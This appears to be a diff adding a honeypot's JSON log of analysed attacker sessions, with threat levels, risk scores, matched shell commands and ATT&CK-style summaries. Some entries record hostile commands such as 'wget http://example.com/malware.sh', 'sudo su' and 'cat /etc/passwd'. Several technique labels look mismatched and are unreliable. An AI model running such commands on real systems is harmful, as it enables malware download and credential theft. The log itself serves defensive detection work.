@@ -1,0 +1,1142 @@
+{
+  "deceptive_test_session": {
+    "level": 3
+  },
+  "3303ceace3e9": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "e7b6c6953e1b": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 25.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls -a",
+          "whoami",
+          "mysql",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "Network Service Discovery (T1046): Attacker executed ['ls', 'ls', 'ls', 'ls', 'ls -a', 'whoami', 'mysql', 'mysql', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Database Enumeration Attempt, Database Enumeration Attempt."
+      }
+    }
+  },
+  "7fe49deeb2ba": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 2.0,
+        "intent": "Curious / Exploratory",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "557b4cdc471e": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 11.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "pwd",
+          "ls -a",
+          "whoami",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Stripped Payloads (T1027.008): Attacker executed ['ped', 'pwd', 'ls -a', 'whoami', 'cd .ssh', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "b339a9bdecd3": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 16.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "pwd",
+          "whoami",
+          "ls-a",
+          "ls -a",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'pwd', 'whoami', 'ls-a', 'ls -a', 'ls', 'cd .ssh', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "7afd88aa7283": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 10.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "pwd",
+          "whoami",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'pwd', 'whoami', 'cd .ssh', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "64272737caa1": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 10.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "lsl"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', '', 'ls', 'ls', 'lsl', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "21a058f45d25": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 18.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "whoami",
+          "pwd",
+          "ls -la",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'ls', 'ls', 'ls', 'whoami', 'pwd', 'ls -la', 's', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "b73782b51072": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 12.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "/etc/passwd and /etc/shadow (T1003.008): Attacker executed ['ls', 'cd /', 'ls', 'cd /bin', 'ls', 'cd /etc', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "0cd3a6717b54": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 12.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "/etc/passwd and /etc/shadow (T1003.008): Attacker executed ['ls', 'cd /', 'ls', 'cd /bin', 'ls', 'cd /etc', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "e4688bb3d9b2": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 10.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'cd /', 'ls', 'cd /bin', '', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "891555b4ef3d": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 13.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'ls', 'ls', 'ls', 'ls', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "7f4db1fa4116": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 19.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "sls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'ls', 'ls', 'ls', 'ls', 'ls', 'sls', 'ls', 's', 's', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "97e5c878f609": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 53.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "df -h",
+          "mysql",
+          "nmap",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "29601b467437": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "a3f74d6a92a7": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 57.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "whoami",
+          "mysql",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "473581407b28": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 12.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls "
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'ls', 'ls', 'ls', 'l', 'ls ', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "23f399cad609": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 31.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "mysql",
+          "whoami",
+          "pwd",
+          "ls",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "Network Service Discovery (T1046): Attacker executed ['ls', 'ls', 'ls', 'ls', 'ls', '', 'ls', 'mysql', 'whoami', '', 'pwd', 'ls', 'ls', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Database Enumeration Attempt, System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "297536243060": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 11.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Local Storage Discovery (T1680): Attacker executed ['ls', 'ls', 'ls', 'ls', 'ls', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "d7d3d961358d": {
+    "level": 1,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 7.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "lsls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "Unknown Technique: Attacker executed ['ls', 'ls', 'lsls', ''], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "9393142a174d": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "08e5e5336dbc": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "7af5632d57e5": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "9e4f5fc7d771": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "31bef025898c": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "03d1be3055ca": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "d82a34591596": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "c4192130747e": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "2f7c9ccfc813": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "7c64879f5bf8": {
+    "level": 0,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 0.0,
+        "intent": "Normal",
+        "rule_matches": []
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "7df54c9610a3": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 117.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "whoami",
+          "mysql",
+          "mysql",
+          "nmap",
+          "df- h",
+          "whoami",
+          "mysql",
+          "mysql",
+          "cat /etc/passwd",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "f88985df16ab": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 97.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "mysql",
+          "nmap",
+          "whoami",
+          "mysql",
+          "df -h",
+          "sudo su",
+          "wget http://example.com/malware.sh",
+          "mysql",
+          "mysql",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "e56abe250837": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 123.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "df -h",
+          "whoami",
+          "df -h",
+          "mysql",
+          "nmap",
+          "mysql",
+          "nmap 127.0.0.1",
+          "mysql",
+          "nmap 127.0.0.1",
+          "wget",
+          "wget malware.sh",
+          "wget /malware.sh",
+          "wget http://example.com/malware.sh",
+          "mysql",
+          "sudo su",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "0ef310f5d92b": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 88.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "mysql",
+          "df -h",
+          "mysql",
+          "nmap",
+          "mysql",
+          "mysql",
+          "mysql",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "5c1e2ce056ca": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 21.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "whoami",
+          "pwd",
+          "ls",
+          "mysql",
+          "nmap 127.0.0.1"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Advanced",
+        "attack_stage": "Unknown",
+        "summary": "Network Service Discovery (T1046): Attacker executed ['ls', 'whoami', 'pwd', 'ls', 'mysql', 'nmap 127.0.0.1', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Database Enumeration Attempt, Network Scanning Activity."
+      }
+    }
+  },
+  "42ae1299e35d": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 29.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "mysql",
+          "nmap",
+          "df -h",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "326485408631": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 20.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "whoami",
+          "pwd",
+          "ls",
+          "whoami",
+          "pwd",
+          "ls -a",
+          "ls",
+          "ls -la"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "System Owner/User Discovery (T1033): Attacker executed ['ls', 'ls', 'whoami', 'pwd', 'ls', 'whoami', 'pwd', 'ls -a', 'ls', 'ls -la'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "1212145bc929": {
+    "level": 2,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 14.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "whoami",
+          "pwd",
+          "ls",
+          "ls -a",
+          "ls -la"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "System Owner/User Discovery (T1033): Attacker executed ['ls', 'ls', 'whoami', 'pwd', 'ls', 'ls -a', 'ls -la'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "a93e725969d0": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 27.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "whoami",
+          "mysql",
+          "nmap",
+          "df -h",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown (No LLM API Key)",
+        "skill_level": "Unknown",
+        "summary": "LLM analysis skipped due to missing API key."
+      }
+    }
+  },
+  "1b8a3b1b7cf6": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 36.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "whoami",
+          "pwd",
+          "ls",
+          "mysql",
+          "ls",
+          "pwd",
+          "whoami",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "Network Service Discovery (T1046): Attacker executed ['ls', 'ls', 'whoami', '', 'pwd', 'ls', 'mysql', 'ls', 'pwd', 'whoami', '', 'ls', 'ls', 'ls', 'ls', 'ls', 'ls'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Database Enumeration Attempt, System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "6ca5d9f59632": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 31.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "whoami",
+          "ls",
+          "ls",
+          "pwd",
+          "mysql",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls",
+          "ls -a"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Intermediate",
+        "attack_stage": "Unknown",
+        "summary": "Network Service Discovery (T1046): Attacker executed ['ls', 'ls', 'whoami', 'ls', 'ls', 'pwd', 'mysql', 'ls', 'ls', 'ls', 'ls', 'ls', 'ls -a', 'exit'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Database Enumeration Attempt, System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "ddbf67bab2f6": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 34.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "whoami",
+          "pwd",
+          "ls",
+          "mysql",
+          "ls",
+          "ls",
+          "ls",
+          "ls -a",
+          "nmap",
+          "ls",
+          "ls",
+          "lsl"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Advanced",
+        "attack_stage": "Unknown",
+        "summary": "Network Service Discovery (T1046): Attacker executed ['ls', 'whoami', 'pwd', 'ls', 'mysql', 'ls', 'ls', 'ls', 'ls -a', 'nmap', 'ls', 'ls', 'lsl'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Database Enumeration Attempt, System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Network Scanning Activity, System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "7ea629421fc1": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 24.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "mysql",
+          "df -h",
+          "ls",
+          "ls",
+          "ls",
+          "nmap"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Advanced",
+        "attack_stage": "Unknown",
+        "summary": "Network Service Discovery (T1046): Attacker executed ['ls', 'ls', 'mysql', 'df -h', 'ls', 'ls', 'ls', 'nmap'], triggering detections: System Discovery (Reconnaissance), System Discovery (Reconnaissance), Database Enumeration Attempt, System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), System Discovery (Reconnaissance), Network Scanning Activity."
+      }
+    }
+  },
+  "f19bc1a3cd98": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 27.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "ls",
+          "whoami",
+          "pwd",
+          "ls",
+          "mysql",
+          "ls",
+          "nmap",
+          "sudo"
+        ]
+      },
+      "llm_based": {
+        "intent": "Privilege Escalation",
+        "skill_level": "Advanced",
+        "attack_stage": "Privilege Escalation",
+        "summary": "The user executed a command sequence ('ls', 'ls', 'whoami', 'pwd', 'ls', 'mysql', 'ls', 'nmap', 'sudo') that matches Network Service Discovery (T1046) behavior, triggering detections: Database Enumeration Attempt, Network Scanning Activity, Privilege Escalation Attempt, System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "82b9d79d5b7d": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 16.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "mysql",
+          "nmap",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Advanced",
+        "attack_stage": "Unknown",
+        "summary": "The user executed a command sequence ('ls', 'mysql', 'nmap', 'ls') that matches Network Service Discovery (T1046) behavior, triggering detections: Database Enumeration Attempt, Network Scanning Activity, System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "a068d158480d": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 23.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "mysql",
+          "wget",
+          "whoami",
+          "pwd",
+          "ls",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Malware Delivery",
+        "skill_level": "Intermediate",
+        "attack_stage": "Execution",
+        "summary": "The user executed a command sequence ('ls', 'mysql', 'wget', 'whoami', 'pwd', 'ls', 'mysql') that matches Network Service Discovery (T1046) behavior, triggering detections: Database Enumeration Attempt, Malware Download Attempt, System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "test_verif_1766514332": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 6.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "nmap -sS 192.168.1.1"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Advanced",
+        "attack_stage": "Unknown",
+        "summary": "The user executed a command sequence ('nmap -sS 192.168.1.1') that matches Network Security Appliances (T1590.006) behavior, triggering detections: Network Scanning Activity."
+      }
+    }
+  },
+  "test_verif_1766514392": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 6.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "nmap -sS 192.168.1.1"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Advanced",
+        "attack_stage": "Unknown",
+        "summary": "The user executed a command sequence ('nmap -sS 192.168.1.1') that matches Network Security Appliances (T1590.006) behavior, triggering detections: Network Scanning Activity."
+      }
+    }
+  },
+  "test_full_1766514686": {
+    "level": 1,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 8.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "mysql -u root"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "The user executed a command sequence ('ls', 'mysql -u root') that matches Install Root Certificate (T1553.004) behavior, triggering detections: Database Enumeration Attempt, System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "9d65c3187bc0": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 20.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "mysql",
+          "whoami",
+          "pwd",
+          "ls",
+          "mysql"
+        ]
+      },
+      "llm_based": {
+        "intent": "Unknown",
+        "skill_level": "Beginner",
+        "attack_stage": "Unknown",
+        "summary": "The user executed a command sequence ('ls', 'mysql', 'whoami', 'pwd', 'ls', 'mysql') that matches Network Service Discovery (T1046) behavior, triggering detections: Database Enumeration Attempt, System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "test_full_1766515056": {
+    "level": 1,
+    "reasoning": {
